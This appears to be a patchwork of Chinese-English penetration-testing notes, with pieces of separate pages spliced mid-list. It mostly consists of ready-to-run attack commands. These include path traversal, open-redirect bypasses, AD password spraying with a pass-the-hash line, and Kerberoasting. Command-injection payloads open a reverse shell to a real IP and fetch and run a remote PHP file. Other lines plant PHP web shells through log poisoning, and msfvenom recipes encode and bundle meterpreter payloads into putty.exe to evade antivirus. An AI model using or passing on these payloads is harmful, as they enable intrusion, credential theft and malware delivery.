上传 # 命令 / 载荷 / 操作片段 # 1. Practice 12345# With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/passwd# Generate a wordlist in STDOUT that can be used by other fuzzers (ffuf, gobuster...)dotdotpwn -m stdout -d 5 # 2. Practice 1kadimus --user-agent "PENTEST" -u '$URL/?parameter=value' # 3. The impact of this 漏洞 is debated. Open redirects can help in phishing attacks but in some cases, it could help 利用 an XSS, a SSRF or a CSRF, hence increasing the impact. Network-path references often 绕过 naive validators that prepend a scheme or only check prefixes: //attacker.tld → interpreted as scheme-relative and navigates off-site with the current scheme. https://trusted.tld@attacker.tld/ → browser navigates to attacker.tld but simple string checks “see” trusted.tld. https://trusted.tld@attacker.tld → some backends treat “\” as a path char and pass validation; browsers normalize to “/” and interpret trusted.tld as userinfo, sending users to attacker.tld. This also appears in Node/PHP URL-parser mismatches. SSRF-server-side-request-forgery/url-format - 绕过.md <summary>More modern URL-based 绕过 载荷 </summary> Don’t forget client-side sinks in SPAs: look for window.location/assign/replace and framework helpers that read query / 哈希 and redirect. OAuth/OIDC flows: abusing open redirectors frequently escalates to account takeover by leaking 授权 codes/tokens. See dedicated guide: Server responses that implement redirects without Location (meta refresh/JavaScript) are still exploitable for phishing and can sometimes be chained. Grep for: Request: GET /user/auth-tokens/rotate?redirectTo=/%23/..////attacker.com HTTP/1.1 Parsing sees Path=/and Fragment=/..////attacker.com, so regex + path.Clean () approve /, but the response emits Location: ///attacker.com, acting as an 开放重定向. /dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser/auth-tokens/rotate The validator checks /dashboard/script/ (no ..), returns the encoded string, and the browser walks to /user/auth-tokens/rotate. content: 来源路径： 02-知识点/域与Windows/密码 policy.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 密码 policy [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 密码 policy 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 密码 policy 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：前置条件、验证步骤、输出判断；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 核心要点 In order to fine-tune this, the 密码 policy can be obtained. This policy can sometimes be enumerated with a null-session (i.e. an MS-RPC null session or an LDAP anonymous bind). On UNIX-like systems, there are many alternatives that allow obtaining the 密码 policy like polenum (Python), NetExec (Python), ldapsearch-ad (Python) and enum4linux. From a domain-joined machine, the net cmdlet can be used to obtain the 密码 policy. From non-domain-joined machines, it can be done with PowerView (Powershell). Also, the Invoke-PassTheCert fork can be used, authenticating through Schannel via PassTheCert (PowerShell version). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). # 命令 / 载荷 / 操作片段 # 1. 密码 policy 1234567891011# polenum (obtained through MS-RPC)polenum -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"# netexec (obtained through MS-RPC)nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --pass-pol# ldapsearch-ad (obtained through LDAP)ldapsearch-ad -l "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -t pass-pol# enum4linux-ng (obtained through MS-RPC)enum4linux-ng -P -w -u "$USER" -p "$PASSWORD" "$DC_IP" # 2. 密码 policy 12net accountsnet accounts /domain # 3. 密码 policy 1Get-DomainPolicy # 4. 密码 policy 12345678910# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Returns any Password-Policy-related attribute of any object of class `domain` in the 'ADLAB.LOCAL' DomainInvoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'PassPol' -SearchBase 'DC=ADLAB,DC=LOCAL' # 工具与参考入口 polenum NetExec ldapsearch-ad PowerView Invoke-PassTheCert PassTheCert README certreq sprayhound kerbrute # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Notice that you could lockout some accounts if you try several wrong passwords (by default more than 10). If you have some user 凭据 or a shell as a domain user you can get the 密码 policy with: Using NetExec (CME successor) for targeted, low-noise spraying across SMB/WinRM: With the scanner/smb/smb login module of Metasploit: With Invoke-DomainPasswordSpray (It can generate users from the domain by default and it will get the 密码 policy from the domain and limit tries according to it): With Invoke-SprayEmptyPassword.ps1 Enumerate users (RID brute via SAMR) to build the target list: Spray an empty 密码 and keep going on hits to capture accounts that must change at next logon: For each hit, change the 密码 over SAMR with NetExec’s module (no old 密码 needed when "must change" is set): Ensure your host clock is in sync with the DC before Kerberos-based operations: sudo ntpdate <dc fqdn>. LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters. Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625). # 命令 / 载荷 / 操作片段 # 1. Get 密码 policy 1234567891011121314# From Linuxcrackmapexec <IP> -u 'user' -p 'password' --pass-polenum4linux -u 'username' -p 'password' -P <IP>rpcclient -U "" -N 10.10.10.10;rpcclient $>querydominfoldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength# From Windowsnet accounts(Get-DomainPolicy)."SystemAccess" #From powerview # 2. 利用 from Linux (or all) 1234crackmapexec smb <IP> -u users.txt -p passwords.txt# Local Auth Spray (once you found some local admin pass or hash)## --local-auth flag indicate to only try 1 time per machinecrackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep + # The following 4 line commands will enumerate the entire AD forest for RBCD, Constrained and 非约束委派 attacks. Note that we will also factor in protocol trainsiton as those change the attack vector slightly. See references below 前置材料 / 凭据：PowerShell 攻击类型：Enumeration # 命令 / 载荷 / 操作片段 # 1. 域命令场景 123456789101112# 1. Unconstrained (turned on for all Domain controllers by default)(Get-ADForest).Domains | % { Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,SamAccountName }# 2. Constrained (with protocol transition check)(Get-ADForest).Domains | % { Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo; Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo }# 3. RBCD (which object is already configured)(Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity -Server $_ | ? {$_."msDS-AllowedToActOnBehalfOfOtherIdentity"} | select Name,DNSHostName }# 4. RBCD (which object can configure it - write access)(Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties nTSecurityDescriptor -Server $_ | ? {$_.nTSecurityDescriptor.Access | ? {$_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" -and $_.IdentityReference -notmatch "SYSTEM|Domain Admins"}} | select Name } # 工具与参考入口 参考 Wagging-the-Dog.html 参考 ADModule # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 Active Directory 攻击链 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This one liner using the powershell AD module serves less as a feasiable attack and more as a PoC that the AD module with some ingenuity can be used to 利用 many vectors within AD that you otherwise import 工具 that are not signed, need obfiscation, require AV/EDR 绕过 or other steps that may trigger alerts. 前置材料 / 凭据：powershell 相关服务：Kerberos 攻击类型：Exploitation # 命令 / 载荷 / 操作片段 # 1. 域命令场景 1Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output "===== $account : $spn =====`n$ticketBase64" } | Out-File -FilePath "kerberos_tickets.txt" -Encoding ASCII # 工具与参考入口 ADModule # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 Active Directory 攻击链 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If the environment enables the runkit extension, an attacker can redefine or inject functions at runtime and escalate a logic-only rule editor into full PHP RCE. Abuse example (redefine a function used by the rules to execute a command): If you are trying to execute arbitrary commands inside a linux machine you will be interested to read about this Bypasses: ../linux-hardening/ 绕过 - bash-restrictions/ Pattern seen in Ivanti EPMM RewriteMap helpers: Send h=gPath ['sleep 5'] so theValue contains an array index; during the arithmetic check it runs sleep 5 (swap for a real 载荷). Arithmetic contexts treat unknown tokens as variable/array identifiers, so this bypasses simple metacharacter filters. Mitigation: use execFile() (or spawn() without the shell option) and provide each argument as a separate array element so no shell is involved: Abuse flags that change behavior or write files, for example: curl: -o /tmp/x to write arbitrary paths, -K <url> to load attacker-controlled config If the program supports -- end-of-options, try to 绕过 naive mitigations that prepend -- in the wrong place. Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) expose /app?service=page/SetupCompleted; browsing there and clicking Login returns a valid JSESSIONID without 凭据 (认证 绕过 in the setup flow). In the printer Scripting tab, enable the script and keep printJobHook defined to avoid validation errors, but place the 载荷 outside the function so it executes immediately when you click Apply (no print job needed): Swap the callback for a 反弹 Shell; if the UI/PoC cannot handle pipes/redirects, stage a 载荷 with one command and exec it with a second request. # 命令 / 载荷 / 操作片段 # 1. 命令注入 / Execution 1234567891011121314151617#Both Unix and Windows supportedls||id; ls ||id; ls|| id; ls || id # Execute bothls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)ls&&id; ls &&id; ls&& id; ls && id # Execute 2º if 1º finish okls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2ºls %0A id # %0A Execute both (RECOMMENDED)ls%0abash%09-c%09"id"%0a # (Combining new lines and tabs)#Only unix supported`ls` # ``$(ls) # $()ls; id # ; Chain commandsls${LS_COLORS:10:1}${IFS}id # Might be useful#Not executed but may be interesting> /var/www/html/out.txt #Try to redirect the output to a file< /etc/passwd #Try to send some input to the command # 2. PHP rule engines with runkit enabled 12<?phprunkit_function_redefine('checkBid', '$bid', 'system($_GET["cmd"]); return true;'); # 3. Examples 123vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.phpvuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay # 4. Bash arithmetic evaluation in RewriteMap/CGI-style scripts 123if ${theCurrentTimeSeconds} -gt ${gStartTime}; then ... fi # 5. Bash arithmetic evaluation in RewriteMap/CGI-style scripts 1curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']" # 6. Time based data exfiltration 123456789swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fireal 0m5.007suser 0m0.000ssys 0m0.000sswissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fireal 0m0.002suser 0m0.000ssys 0m0.000s # 7. title: 内网渗透-免杀
content: 来源路径： 02-知识点/域与Windows/内网渗透-免杀.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 内网渗透 - 免杀 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 内网渗透 - 免杀 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 内网渗透 - 免杀 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：杀软原理、静态检测、动态检测、流量检测、云查杀；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 杀软原理 静态检测 动态检测 流量检测 云查杀 免杀原理 静态免杀 修改特征码 花指令免杀 加壳免杀 动态免杀 API 免杀 内存免杀 二次编译 分离免杀 资源修改 免杀技术研究 绕过一览表（2020 年） # 核心要点 可执行文件存在的两种状态及检测方式： 可疑：存在可疑行为，例如操作注册表、打开 Powershell、修改用户、操作敏感文件等 静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。 静态检测针对样本文件在硬盘上的状态进行检测： 样本哈希检测：此类检测会对文件整体以及各个节段进行哈希计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于哈希检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的哈希。 特征码检测：由于样本哈希检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的 IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。 黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。 Windows API 函数：尤其是与内存、堆、线程相关的函数，例如 virualalloc、rtlmovememory、ntcreatthread 等。 绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加 / 替换资源、加密 Shellcode 等 https://www.virustotal.com/，注意：Virustotal 是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查 MD5 是否为恶意文件。 内存特征码检测：对于静态文件特征码来说，可以将 shellcode 做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode 需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。 敏感 API 检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。 敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个 API 是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为： 文件操作：写入文件、读取系统文件、删除文件、移动文件。 # 命令 / 载荷 / 操作片段 # 1. Metasploit 自带免杀 1234msf6 > use exploits/multi/handlermsf6 exploit(multi/handler) > set LHOST 192.168.174.128msf6 exploit(multi/handler) > set LPORT 6666msf6 exploit(multi/handler) > run # 2. 原生态载荷 (VT 查杀率 51/69) 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe # 3. msf 自编码免杀 (VT 查杀率 48/67) 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o /mnt/hgfs/Share/payload2.exe # 4. msf 自捆绑免杀 (VT 查杀率 15/69) 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -x putty.exe -f exe -o /mnt/hgfs/Share/payload3.exe # 5. msf 自捆绑 + 编码 (VT 查杀率 16/69) 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe # 6. msfvenom 多重编码 (VT 查杀率 28/67) 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe # 7. msfvenom 多重编码 (VT 查杀率 28/67) 1-a x86 --platform windows # 8. msfvenom 多重编码 (VT 查杀率 28/67) 1msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b "&" -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe > payload6.exe # 9. 生成 exe (VT 查杀率 43/69) 123456msf6 > use windows/windows_defender_exemsf6 evasion(windows/windows_defender_exe) > set filename payload.exemsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcpmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128msf6 evasion(windows/windows_defender_exe) > set LPORT 6666msf6 evasion(windows/windows_defender_exe) > run # 10. 生成 exe (VT 查杀率 43/69) 1handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp # 11. 生成 hta (VT 查杀率 14/59) 123456msf6 > use windows/windows_defender_js_htamsf6 evasion(windows/windows_defender_exe) > set filename payload1.exemsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcpmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128msf6 evasion(windows/windows_defender_exe) > set LPORT 6666msf6 evasion(windows/windows_defender_exe) > run # On a Linux system, the login will be echoed in /var/log/auth.log. By exploiting a 本地文件包含 LFI, the attacker will be able to make the crafted login echoed in this file interpreted by the server. When the FTP service is available, testers can try to access the /var/log/vsftpd.log and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a 载荷 (depending on which web technology is used). When an SMTP server is running and writing logs in /var/log/mail.log, it's possible to inject a 载荷 using telnet (as an example). # 命令 / 载荷 / 操作片段 # 1. logs poisoning 12345# Sending the payload via SSHssh '<php phpinfo(); ?>'@$TARGET# Accessing the log file via LFIcurl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id # 2. logs poisoning 123456# Sending the payload via FTPftp $TARGET_IP> '<php system($_GET['cmd'])?>'# Accessing the log file via LFIcurl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id # 3. logs poisoning 12345678# Sending the payload via netcatnc $TARGET_IP $TARGET_PORT> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1> Host: $TARGET_IP> Connection: close# Accessing the log file via LFIcurl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id # 4. logs poisoning 12345678# Sending the payload via netcatnc $TARGET_IP $TARGET_PORT> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1> Host: $TARGET_IP> Connection: close# Accessing the log file via LFIcurl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id # 5. logs poisoning 1234567# Sending the payload via telnettelnet $TARGET_IP $TARGET_PORT> MAIL FROM:<pentest@pentest.com>> RCPT TO:<?php system($_GET['cmd']); ?># Accessing the log file via LFIcurl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id" # 工具与参考入口 some variations # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
